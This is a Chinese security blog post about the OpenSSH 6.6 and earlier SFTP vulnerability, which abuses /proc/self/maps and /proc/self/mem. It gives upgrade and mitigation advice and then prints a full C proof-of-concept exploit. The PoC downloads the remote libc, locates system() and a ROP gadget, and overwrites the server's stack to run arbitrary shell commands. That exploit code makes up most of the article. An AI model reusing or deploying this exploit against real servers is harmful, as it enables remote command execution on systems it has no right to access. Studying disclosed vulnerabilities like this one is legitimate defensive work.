<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="renderer" content="webkit"><meta name="viewport" content="initial-scale=1.0,maximum-scale=5,width=device-width,viewport-fit=cover"><title>OPENSSH SFTP 远程溢出漏洞 - 老D博客</title><meta name="keywords" content="OPENSSH,远程溢出" /><meta name="description" content="近日曝出OpenSSHSFTP远程溢出漏洞。OpenSSH服务器中如果OpenSSH服务器中没有配置&quot;ChrootDirectory&quot;，普通用户就可以访问所有文件系统的资源，包括/proc，在&gt;=2.6.x的Linux内核上，/proc/self/maps会显示你的内存布局，/proc/self/mem可以让你任意在当前进程上下文中读写，而综合两者特性则可以造成远程溢出。 目前受影响的版本是..." /><meta property="og:type" content="article" /><meta property="og:url" content="https://laod.cn/security/openssh-sftp.html" /><meta property="og:site_name" content="老D博客" /><meta property="og:title" content="OPENSSH SFTP 远程溢出漏洞" /><meta property="og:image" content="https://laod.cn/wp-content/uploads/2014/10/OPENSSH-SFTP.png" /><meta property="og:description" content="近日曝出OpenSSHSFTP远程溢出漏洞。OpenSSH服务器中如果OpenSSH服务器中没有配置&quot;ChrootDirectory&quot;，普通用户就可以访问所有文件系统的资源，包括/proc，在&gt;=2.6.x的Linux内核上，/proc/self/maps会显示你的内存布局，/proc/self/mem可以让你任意在当前进程上下文中读写，而综合两者特性则可以造成远程溢出。 目前受影响的版本是..." /><link rel="canonical" href="https://laod.cn/security/openssh-sftp.html" /><meta name="applicable-device" content="pc,mobile" /><meta http-equiv="Cache-Control" content="no-transform" /><link rel="shortcut icon" href="https://laod.cn/wp-content/uploads/2021/03/favicon.ico" /><link rel='dns-prefetch' href='//cdn.laod.wang' /><link rel='dns-prefetch' href='//s2.ax1x.com' /><link rel='stylesheet' id='stylesheet-css' href='//laod.cn/wp-content/uploads/wpcom/style.6.8.2.1632028585.css?ver=6.8.2' type='text/css' media='all' /><link rel='stylesheet' id='font-awesome-css' href='https://laod.cn/wp-content/themes/justnews/themer/assets/css/font-awesome.css?ver=6.8.2' type='text/css' media='all' /><link rel='stylesheet' id='wp-block-library-css' href='https://laod.cn/wp-includes/css/dist/block-library/style.min.css?ver=5.9.1' type='text/css' media='all' /><style id='global-styles-inline-css' type='text/css'>body{--wp--preset--color--black:#000;--wp--preset--color--cyan-bluish-gray:#abb8c3;--wp--preset--color--white:#fff;--wp--preset--color--pale-pink:#f78da7;--wp--preset--color--vivid-red:#cf2e2e;--wp--preset--color--luminous-vivid-orange:#ff6900;--wp--preset--color--luminous-vivid-amber:#fcb900;--wp--preset--color--light-green-cyan:#7bdcb5;--wp--preset--color--vivid-green-cyan:#00d084;--wp--preset--color--pale-cyan-blue:#8ed1fc;--wp--preset--color--vivid-cyan-blue:#0693e3;--wp--preset--color--vivid-purple:#9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple:linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan:linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange:linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red:linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray:linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum:linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple:linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux:linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk:linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean:linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass:linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight:linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale:url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale:url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow:url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red:url('#wp-duotone-blue-red');--wp--preset--duotone--midnight:url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow:url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green:url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange:url('#wp-duotone-blue-orange');--wp--preset--font-size--small:13px;--wp--preset--font-size--medium:20px;--wp--preset--font-size--large:36px;--wp--preset--font-size--x-large:42px}.has-black-color{color:var(--wp--preset--color--black)!important}.has-cyan-bluish-gray-color{color:var(--wp--preset--color--cyan-bluish-gray)!important}.has-white-color{color:var(--wp--preset--color--white)!important}.has-pale-pink-color{color:var(--wp--preset--color--pale-pink)!important}.has-vivid-red-color{color:var(--wp--preset--color--vivid-red)!important}.has-luminous-vivid-orange-color{color:var(--wp--preset--color--luminous-vivid-orange)!important}.has-luminous-vivid-amber-color{color:var(--wp--preset--color--luminous-vivid-amber)!important}.has-light-green-cyan-color{color:var(--wp--preset--color--light-green-cyan)!important}.has-vivid-green-cyan-color{color:var(--wp--preset--color--vivid-green-cyan)!important}.has-pale-cyan-blue-color{color:var(--wp--preset--color--pale-cyan-blue)!important}.has-vivid-cyan-blue-color{color:var(--wp--preset--color--vivid-cyan-blue)!important}.has-vivid-purple-color{color:var(--wp--preset--color--vivid-purple)!important}.has-black-background-color{background-color:var(--wp--preset--color--black)!important}.has-cyan-bluish-gray-background-color{background-color:var(--wp--preset--color--cyan-bluish-gray)!important}.has-white-background-color{background-color:var(--wp--preset--color--white)!important}.has-pale-pink-background-color{background-color:var(--wp--preset--color--pale-pink)!important}.has-vivid-red-background-color{background-color:var(--wp--preset--color--vivid-red)!important}.has-luminous-vivid-orange-background-color{background-color:var(--wp--preset--color--luminous-vivid-orange)!important}.has-luminous-vivid-amber-background-color{background-color:var(--wp--preset--color--luminous-vivid-amber)!important}.has-light-green-cyan-background-color{background-color:var(--wp--preset--color--light-green-cyan)!important}.has-vivid-green-cyan-background-color{background-color:var(--wp--preset--color--vivid-green-cyan)!important}.has-pale-cyan-blue-background-color{background-color:var(--wp--preset--color--pale-cyan-blue)!important}.has-vivid-cyan-blue-background-color{background-color:var(--wp--preset--color--vivid-cyan-blue)!important}.has-vivid-purple-background-color{background-color:var(--wp--preset--color--vivid-purple)!important}.has-black-border-color{border-color:var(--wp--preset--color--black)!important}.has-cyan-bluish-gray-border-color{border-color:var(--wp--preset--color--cyan-bluish-gray)!important}.has-white-border-color{border-color:var(--wp--preset--color--white)!important}.has-pale-pink-border-color{border-color:var(--wp--preset--color--pale-pink)!important}.has-vivid-red-border-color{border-color:var(--wp--preset--color--vivid-red)!important}.has-luminous-vivid-orange-border-color{border-color:var(--wp--preset--color--luminous-vivid-orange)!important}.has-luminous-vivid-amber-border-color{border-color:var(--wp--preset--color--luminous-vivid-amber)!important}.has-light-green-cyan-border-color{border-color:var(--wp--preset--color--light-green-cyan)!important}.has-vivid-green-cyan-border-color{border-color:var(--wp--preset--color--vivid-green-cyan)!important}.has-pale-cyan-blue-border-color{border-color:var(--wp--preset--color--pale-cyan-blue)!important}.has-vivid-cyan-blue-border-color{border-color:var(--wp--preset--color--vivid-cyan-blue)!important}.has-vivid-purple-border-color{border-color:var(--wp--preset--color--vivid-purple)!important}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background:var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple)!important}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background:var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan)!important}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background:var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange)!important}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background:var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red)!important}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background:var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray)!important}.has-cool-to-warm-spectrum-gradient-background{background:var(--wp--preset--gradient--cool-to-warm-spectrum)!important}.has-blush-light-purple-gradient-background{background:var(--wp--preset--gradient--blush-light-purple)!important}.has-blush-bordeaux-gradient-background{background:var(--wp--preset--gradient--blush-bordeaux)!important}.has-luminous-dusk-gradient-background{background:var(--wp--preset--gradient--luminous-dusk)!important}.has-pale-ocean-gradient-background{background:var(--wp--preset--gradient--pale-ocean)!important}.has-electric-grass-gradient-background{background:var(--wp--preset--gradient--electric-grass)!important}.has-midnight-gradient-background{background:var(--wp--preset--gradient--midnight)!important}.has-small-font-size{font-size:var(--wp--preset--font-size--small)!important}.has-medium-font-size{font-size:var(--wp--preset--font-size--medium)!important}.has-large-font-size{font-size:var(--wp--preset--font-size--large)!important}.has-x-large-font-size{font-size:var(--wp--preset--font-size--x-large)!important}</style> <script type='text/javascript' src='https://laod.cn/wp-content/themes/justnews/themer/assets/js/jquery-3.6.0.min.js?ver=3.6.0' id='jquery-core-js'></script> <script type='text/javascript' src='https://laod.cn/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script> <script type='text/javascript' src='https://laod.cn/wp-content/themes/justnews/themer/assets/js/icons-2.6.18.js?ver=6.8.2' id='wpcom-icons-js'></script> <link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://laod.cn/xmlrpc.php?rsd" /><link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://laod.cn/wp-includes/wlwmanifest.xml" /><link rel="icon" href="https://laod.cn/wp-content/uploads/2021/03/favicon.ico" sizes="32x32" /><link rel="icon" href="https://laod.cn/wp-content/uploads/2021/03/favicon.ico" sizes="192x192" /><link rel="apple-touch-icon" href="https://laod.cn/wp-content/uploads/2021/03/favicon.ico" /><meta name="msapplication-TileImage" content="https://laod.cn/wp-content/uploads/2021/03/favicon.ico" /> <noscript><style id="rocket-lazyload-nojs-css">.rll-youtube-player,[data-lazy-src]{display:none!important}</style></noscript> <!--[if lte IE 9]><script src="https://laod.cn/wp-content/themes/justnews/js/update.js"></script><![endif]--></head><body class="post-template-default single single-post postid-226 single-format-standard lang-cn el-boxed"><header class="header"><div class="container clearfix"><div class="navbar-header"> <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse" aria-label="menu"> <span class="icon-bar icon-bar-1"></span> <span class="icon-bar icon-bar-2"></span> <span class="icon-bar icon-bar-3"></span> </button><div class="logo"> <a href="https://laod.cn" rel="home"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="老D博客" data-lazy-src="https://laod.cn/wp-content/uploads/2020/05/shinian-logo.png"><noscript><img src="https://laod.cn/wp-content/uploads/2020/05/shinian-logo.png" alt="老D博客"></noscript></a></div></div><div class="collapse navbar-collapse"><nav class="navbar-left primary-menu"><ul id="menu-x" class="nav navbar-nav wpcom-adv-menu"><li class="zmzm-shouye menu-item"><a href="https://laod.cn">首页</a></li><li class="zmzm-feiji1 menu-item"><a href="https://laod.cn/hosts">hosts</a></li><li class="zmzm-gongju menu-item"><a href="https://laod.cn/tools">工具软件</a></li><li class="zmzm-code menu-item"><a href="https://laod.cn/code-audit">代码审计</a></li><li class="zmzm-keji menu-item"><a href="https://laod.cn/black-technology">黑科技</a></li><li class="zmzm-liuyan menu-item"><a href="https://laod.cn/guestbook">留言版</a></li><li class="zmzm-gengduo menu-item menu-item-style menu-item-style1 dropdown"><a href="#" class="dropdown-toggle">查看更多</a><ul class="dropdown-menu menu-item-wrap menu-item-col-4"><li class="zmzm-dianying menu-item"><a href="https://laod.cn/movie">电影·美剧</a></li><li class="zmzm-anquan menu-item current-post-ancestor current-post-parent active"><a href="https://laod.cn/security">网络安全</a></li><li class="zmzm-zixun menu-item"><a href="https://laod.cn/news">业界资讯</a></li><li class="zmzm-mianfei-copy menu-item"><a href="https://laod.cn/free">免费资源</a></li></ul></li></ul></nav><div class="navbar-action pull-right"><div class="navbar-search-icon j-navbar-search"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-search"></use></svg></i></div><div id="j-user-wrap"> <a class="login" href="https://laod.cn/login?modal-type=login">登录</a> <a class="login register" href="https://laod.cn/register?modal-type=register">注册</a></div></div><form class="navbar-search" action="https://laod.cn" method="get" role="search"><div class="navbar-search-inner"> <i class="wpcom-icon wi navbar-search-close"><svg aria-hidden="true"><use xlink:href="#wi-close"></use></svg></i> <input type="text" name="s" class="navbar-search-input" autocomplete="off" placeholder="输入关键词搜索..." value=""> <button class="navbar-search-btn" type="submit"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-search"></use></svg></i></button></div></form></div></div></header><div id="wrap"><div class="wrap container"><main class="main"><article id="post-226" class="post-226 post type-post status-publish format-standard hentry category-security tag-openssh tag-69 entry"><div class="entry-main"><div class="entry-head"><h1 class="entry-title">OPENSSH SFTP 远程溢出漏洞</h1><div class="entry-info"> <time class="entry-date published" datetime="2014-10-24T05:50:18+08:00" pubdate> 2014-10-24 05:50 </time> <span class="dot">•</span> <a href="https://laod.cn/security" rel="category tag">网络安全</a> <span class="dot">•</span> <span>阅读 3529</span></div></div><div class="entry-content text-indent"><p>近日曝出<strong>OpenSSH SFTP 远程溢出漏洞</strong>。<strong>OpenSSH</strong>服务器中如果<strong>OpenSSH</strong>服务器中没有配置&#8221;ChrootDirectory&#8221;，普通用户就可以访问所有文件系统的资源，包括 /proc，在&gt;=2.6.x的Linux内核上，/proc/self/maps会显示你的内存布局，/proc/self/mem可以让你任意在当前进程上下文中读写，而综合两者特性则可以造成远程溢出。</p><p>目前受影响的版本是&lt;=<strong>OpenSSH 6.6</strong>，建议使用该系统的用户尽快升级到最新版本OpenSSH 6.7, OpenSSH 6.7包含了降低风险的方案：sftp-server使用prctl()来阻止直接访问/proc/self/{mem,maps}。Grsecurity/PaX直接禁止了/proc/pid/mem的可写，所以如果您的生产环境中部署了Grsecurity/PaX的话这个漏洞可以不用担心.</p><figure id="attachment_227" aria-describedby="caption-attachment-227" style="width: 220px" class="wp-caption alignnone"><a href="https://laod.cn/wp-content/uploads/2014/10/OPENSSH-SFTP.png" rel="https://laod.cn"><noscript><img class="wp-image-227 size-full" title="OPENSSH SFTP" src="https://laod.cn/wp-content/uploads/2014/10/OPENSSH-SFTP.png" alt="OPENSSH SFTP" width="220" height="220" /></noscript><img class="wp-image-227 size-full j-lazy" title="OPENSSH SFTP" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20220%20220'%3E%3C/svg%3E" data-original="https://laod.cn/wp-content/uploads/2014/10/OPENSSH-SFTP.png" alt="OPENSSH SFTP" width="220" height="220" data-lazy-src="https://laod.cn/wp-content/themes/justnews/themer/assets/images/lazy.png" /><noscript><img class="wp-image-227 size-full j-lazy" title="OPENSSH SFTP" src="https://laod.cn/wp-content/themes/justnews/themer/assets/images/lazy.png" data-original="https://laod.cn/wp-content/uploads/2014/10/OPENSSH-SFTP.png" alt="OPENSSH SFTP" width="220" height="220" /></noscript></a><figcaption id="caption-attachment-227" class="wp-caption-text">OPENSSH SFTP</figcaption></figure><p><b>OpenSSH &lt;=6.6 SFTP 远程溢出漏洞 PoC for 64bit Linux：</b></p><pre class="lang:default decode:true">#define _GNU_SOURCE
// THIS PROGRAM IS NOT DESIGNED TO BE SAFE AGAINST VICTIM MACHINES THAT
// TRY TO ATTACK BACK, THE CODE IS SLOPPY!
// (In other words, please don't use this against other people's machines.)
#include &lt;libssh/libssh.h&gt; #include &lt;libssh/sftp.h&gt; #include
#include
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include
#include
#include
#define min(a,b) (((a)&lt;(b))?(a):(b))
sftp_session sftp;
size_t grab_file(char *rpath, char **out) {
size_t allocated = 4000, used = 0;
*out = calloc(1, allocated+1);
sftp_file f = sftp_open(sftp, rpath, O_RDONLY, 0);
if (f == NULL) fprintf(stderr, "Error opening remote file %s: %s\n", rpath, ssh_get_error(sftp)), exit(1);
while (1) {
ssize_t nbytes = sftp_read(f, *out+used, allocated-used);
if (nbytes &lt; 0) fprintf(stderr, "Error reading remote file %s: %s\n", rpath, ssh_get_error(sftp)), exit(1);
if (nbytes == 0) {
(*out)[used] = '\0';
sftp_close(f);
return used;
}
used += nbytes;
if (used == allocated) {
allocated *= 4;
*out = realloc(*out, allocated);
}
}
}
void dump_file(char *name, void *buf, size_t len) {
FILE *f = fopen(name, "w+");
if (!f) perror("can't write to local file"), exit(1);
if (fwrite(buf, 1, len, f) != len) fprintf(stderr, "local write failed\n"), exit(1);
if (fclose(f)) fprintf(stderr, "fclose error\n"), exit(1);
}
size_t slurp_file(char *path, char **out) {
size_t allocated = 4000, used = 0;
*out = calloc(1, allocated+1);
FILE *f = fopen(path, "r");
if (f == NULL) perror("opening local file failed"), exit(1);
while (1) {
ssize_t nbytes = fread(*out+used, 1, allocated-used, f);
if (nbytes &lt; 0) fprintf(stderr, "Error reading local file %s: %s\n", path, strerror(errno)), exit(1); if (nbytes == 0) { (*out)[used] = '\0'; if (fclose(f)) fprintf(stderr, "fclose error\n"), exit(1); return used; } used += nbytes; if (used == allocated) { allocated *= 4; *out = realloc(*out, allocated); } } } int main(int argc, char **argv) { if (argc != 4) fprintf(stderr, "invocation: ./exploit host user 'shell commands here'\n"), exit(1); char *target_host = argv[1]; char *target_user = argv[2]; char *shell_commands = argv[3]; ssh_session my_ssh_session; int rc; char *password; // Open session and set options my_ssh_session = ssh_new(); if (my_ssh_session == NULL) exit(-1); ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, target_host); ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, target_user); // Connect to server rc = ssh_connect(my_ssh_session); if (rc != SSH_OK) fprintf(stderr, "Error connecting to host: %s\n", ssh_get_error(my_ssh_session)), exit(-1); // Authenticate ourselves password = getpass("Password: "); rc = ssh_userauth_password(my_ssh_session, NULL, password); if (rc != SSH_AUTH_SUCCESS) fprintf(stderr, "Error authenticating with password: %s\n", ssh_get_error(my_ssh_session)), exit(-1); sftp = sftp_new(my_ssh_session); if (sftp == NULL) fprintf(stderr, "Error allocating SFTP session: %s\n", ssh_get_error(my_ssh_session)), exit(-1); rc = sftp_init(sftp); if (rc != SSH_OK) { fprintf(stderr, "Error initializing SFTP session: %s.\n", ssh_get_error(sftp)); sftp_free(sftp); return rc; } char *mappings; grab_file("/proc/self/maps", &amp;mappings); //printf("/proc/self/maps dump: \n%s\n\n\n", mappings); printf("got /proc/self/maps. looking for libc...\n"); // 7fc9e742b000-7fc9e75ad000 r-xp 00000000 fe:00 2753466 /lib/x86_64-linux-gnu/libc-2.13.so long long start_addr, end_addr, offset; char *libc_path = NULL; long long stack_start_addr = 0, stack_end_addr; for (char *p = strtok(mappings, "\n"); p; p = strtok(NULL, "\n")) { if (strstr(p, " r-xp ") &amp;&amp; strstr(p, "/libc-")) { if (libc_path) fprintf(stderr, "warning: two times libc?\n"); printf("mapping line: %s\n", p); if (sscanf(p, "%Lx-%Lx %*4c %Lx", &amp;start_addr, &amp;end_addr, &amp;offset) != 3) perror("scanf failed"), exit(1); libc_path = strdup(strchr(p, '/')); if (libc_path == NULL) fprintf(stderr, "no path in mapping?"), exit(1); } if (strstr(p, "[stack]")) { if (stack_start_addr != 0) fprintf(stderr, "two stacks? no."), exit(1); printf("mapping line: %s\n", p); if (sscanf(p, "%Lx-%Lx ", &amp;stack_start_addr, &amp;stack_end_addr) != 2) perror("scanf failed"), exit(1); } } if (libc_path == NULL) fprintf(stderr, "unable to find libc\n"), exit(1); if (stack_start_addr == 0) fprintf(stderr, "unable to find stack"), exit(1); printf("remote libc is at %s\n", libc_path); printf("offset %Lx from libc is mapped to %Lx-%Lx\n", offset, start_addr, end_addr); char *libc; size_t libc_size = grab_file(libc_path, &amp;libc); dump_file("libc.so", libc, libc_size); printf("downloaded libc, size is %zu bytes\n", libc_size); system("objdump -T libc.so | grep ' system$' | cut -d' ' -f1 &gt; system.addr");
char *system_offset_str;
slurp_file("system.addr", &amp;system_offset_str);
long long system_offset;
if (sscanf(system_offset_str, "%Lx", &amp;system_offset) != 1) perror("scanf failed"), exit(1);
long long remote_system_addr = start_addr+system_offset-offset;
printf("remote system() function is at %Lx\n", remote_system_addr);
printf("looking for ROP gadget `pop rdi;ret` (0x5fc3) in libc...\n");
char *gadget = memmem(libc+offset, end_addr-start_addr, "\x5f\xc3", 2);
if (gadget == NULL) fprintf(stderr, "no gadget found :(\n"), exit(1);
long long gadget_address = start_addr + (gadget-(libc+offset));
long long ret_address = gadget_address+1;
printf("found gadget at %Lx\n", gadget_address);
printf("remote stack is at %Lx-%Lx\n", stack_start_addr, stack_end_addr);
printf("doing it the quick-and-dirty way (that means: pray that the target"
"program was compiled with gcc, giving us 16-byte stack alignment)...\n");
long long stack_len = stack_end_addr - stack_start_addr;
/*if (stack_len &gt; 32000) {
stack_len = 32000;
stack_start_addr = stack_end_addr - stack_len;
}*/
char *new_stack = malloc(stack_len);
// first fill it with our ret slide
for (long long *s = (void*)new_stack; s&lt;(long long*)(new_stack+stack_len); s++) { *s = ret_address; } // put some shell commands in the head strcpy(new_stack, shell_commands); // put the mini-ROP-chain at the end // [address of pop rdi] [stack head] [address of system] long long *se = (void*)(new_stack + stack_len); se[-3] = gadget_address; se[-2] = stack_start_addr; se[-1] = remote_system_addr; printf("Prepared the new stack. Now comes the moment of truth: push the new stack over and pray.\n"); sftp_file mem = sftp_open(sftp, "/proc/self/mem", O_RDWR, 0); if (mem == NULL) fprintf(stderr, "Error opening remote memory: %s\n", ssh_get_error(sftp)), exit(1); // first send over the string rc = sftp_seek64(mem, stack_start_addr); if (rc) fprintf(stderr, "Error seeking to remote stack: %s\n", ssh_get_error(sftp)), exit(1); ssize_t mem_written = sftp_write(mem, new_stack, strlen(shell_commands)+1); if (mem_written != strlen(shell_commands)+1) fprintf(stderr, "didn't write the whole new stack\n"); // now send over the rest right-to-left for (long long off = stack_len-32000; off &gt;= 0; off -= 32000) {
rc = sftp_seek64(mem, stack_start_addr+off);
if (rc) fprintf(stderr, "Error seeking: %s\n", ssh_get_error(sftp)), exit(1);
mem_written = sftp_write(mem, new_stack+off, 32000);
if (mem_written != 32000) fprintf(stderr, "stack write failed – that's probably good :)\n"), exit(0);
}
return 0;
}</pre><p><span style="color: #555555;">OpenSSH 6.7下载地址：</span></p><p>ftp://ftp.openbsd.com/pub/OpenBSD/OpenSSH/portable/openssh-6.7p1.tar.gz</p><p>参考信息：</p><p>http://seclists.org/fulldisclosure/2014/Oct/35</p><div class="entry-copyright"><p>原创文章，作者：老D，如若转载，请注明出处：https://laod.cn/security/openssh-sftp.html</p></div></div><div class="entry-tag"><a href="https://laod.cn/tag/openssh" rel="tag">OPENSSH</a><a href="https://laod.cn/tag/%e8%bf%9c%e7%a8%8b%e6%ba%a2%e5%87%ba" rel="tag">远程溢出</a></div><div class="entry-action"><div class="btn-zan" data-id="226"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up-fill"></use></svg></i> 赞 <span class="entry-action-num">(0)</span></div></div><div class="entry-bar"><div class="entry-bar-inner clearfix"><div class="info text-center"><div class="info-item meta"> <a class="meta-item j-heart" href="javascript:;" data-id="226"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i> <span class="data">0</span></a> <a class="meta-item" href="#comments"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i> <span class="data">0</span></a></div><div class="info-item share"> <a class="meta-item mobile j-mobile-share" href="javascript:;" data-id="226" data-qrcode="https://laod.cn/security/openssh-sftp.html"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-share"></use></svg></i> 生成海报</a> <a class="meta-item wechat" data-share="wechat" target="_blank" rel="nofollow" href="#"> <i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-wechat"></use></svg></i> </a> <a class="meta-item weibo" data-share="weibo" target="_blank" rel="nofollow" href="#"> <i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-weibo"></use></svg></i> </a> <a class="meta-item qq" data-share="qq" target="_blank" rel="nofollow" href="#"> <i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-qq"></use></svg></i> </a> <a class="meta-item qzone" data-share="qzone" target="_blank" rel="nofollow" href="#"> <i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-qzone"></use></svg></i> </a></div><div class="info-item act"> <a href="javascript:;" id="j-reading"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-article"></use></svg></i></a></div></div></div></div></div><div class="entry-page"><div class="entry-page-prev entry-page-nobg" style="background-image: url();"> <a href="https://laod.cn/news/black-production.html" title="浅谈黑产" rel="prev"> <span>浅谈黑产</span> </a><div class="entry-page-info"> <span class="pull-left"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-arrow-left-double"></use></svg></i> 上一篇</span> <span class="pull-right">2014-10-13 23:41</span></div></div><div class="entry-page-next entry-page-nobg" style="background-image: url();"> <a href="https://laod.cn/security/kon-boot-2-4.html" title="密码破解工具【Kon-Boot】2.4 商业付费版 免费下载" rel="next"> <span>密码破解工具【Kon-Boot】2.4 商业付费版 免费下载</span> </a><div class="entry-page-info"> <span class="pull-right">下一篇 <i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-arrow-right-double"></use></svg></i></span> <span class="pull-left">2014-10-25 01:47</span></div></div></div><div class="entry-related-posts"><h3 class="entry-related-title">相关推荐</h3><ul class="entry-related cols-3 post-loop post-loop-default"><li class="item"><div class="item-img"> <a class="item-img-inner" href="https://laod.cn/security/aliyun-tengxunyun-ip.html" title="腾讯云、阿里云 服务器IP地址被封如何更换新的IP地址" target="_blank" rel="bookmark"> <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20480%20300'%3E%3C/svg%3E" width="480" height="300" alt="腾讯云、阿里云 服务器IP地址被封如何更换新的IP地址" data-lazy-src="https://laod.cn/wp-content/uploads/2019/06/yun-480x300.jpeg"><noscript><img src="https://laod.cn/wp-content/uploads/2019/06/yun-480x300.jpeg" width="480" height="300" alt="腾讯云、阿里云 服务器IP地址被封如何更换新的IP地址"></noscript> </a> <a class="item-category" href="https://laod.cn/security" target="_blank">网络安全</a></div><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/security/aliyun-tengxunyun-ip.html" target="_blank" rel="bookmark"> 腾讯云、阿里云 服务器IP地址被封如何更换新的IP地址 </a></h4><div class="item-excerpt"><p>最近群里有的人抱怨腾讯云的服务器IP被封了，老D问及原因：有的说是搭了梯子，有的说弄了群发邮件服务器，有的用来搭建DNS。这个不奇怪，看到有很多人提到阿里云新加坡等海外机房也都这样&#8230;</p></div><div class="item-meta"> <span class="item-meta-li date">2019-06-06</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>12.0K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/security/aliyun-tengxunyun-ip.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>2</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li><li class="item"><div class="item-img"> <a class="item-img-inner" href="https://laod.cn/security/linux-tcp-sack-panic.html" title="Linux TCP &#8220;SACK PANIC&#8221; 远程拒绝服务漏洞修复" target="_blank" rel="bookmark"> <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20480%20300'%3E%3C/svg%3E" width="480" height="300" alt="Linux TCP &#8220;SACK PANIC&#8221; 远程拒绝服务漏洞修复" data-lazy-src="https://laod.cn/wp-content/uploads/2019/06/l0-480x300.jpg"><noscript><img src="https://laod.cn/wp-content/uploads/2019/06/l0-480x300.jpg" width="480" height="300" alt="Linux TCP &#8220;SACK PANIC&#8221; 远程拒绝服务漏洞修复"></noscript> </a> <a class="item-category" href="https://laod.cn/security" target="_blank">网络安全</a></div><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/security/linux-tcp-sack-panic.html" target="_blank" rel="bookmark"> Linux TCP &#8220;SACK PANIC&#8221; 远程拒绝服务漏洞修复 </a></h4><div class="item-excerpt"><p>最近两天网上曝出：Linux 内核被曝存在TCP “SACK PANIC” 远程拒绝服务漏洞（漏洞编号：CVE-2019-11477,CVE-2019-11478,CVE-2019&#8230;</p></div><div class="item-meta"> <span class="item-meta-li date">2019-06-21</span><div class="item-meta-right"> <span class="item-meta-li views" 